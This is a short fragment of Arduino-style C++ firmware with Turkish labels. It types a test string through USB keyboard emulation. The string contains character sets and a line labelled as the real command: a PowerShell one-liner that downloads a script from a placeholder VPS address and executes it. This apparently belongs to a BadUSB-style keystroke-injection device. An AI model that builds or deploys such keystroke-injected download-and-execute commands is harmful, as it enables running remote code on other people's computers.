    "BUYUKLER: ABCDEFGHIJKLMNOPQRSTUVWXYZ\n"
    "DIGITS:   0123456789\n"
    "OZELLER:  - : / . = + ' ( ) \" * , _ ?\n"
    "PLAIN INNER (asil komut):\n"
    "iex (iwr 'http://YOUR_VPS_IP:8003/it_script/abcd1234' -usebasicparsing).content\n"
    "--- TEST BITTI ---\n";

  itTypeStringHID(t);

  Serial.printf("IT: Klavye testi tamamlandi (%d karakter yazildi)\n", t.length());
}

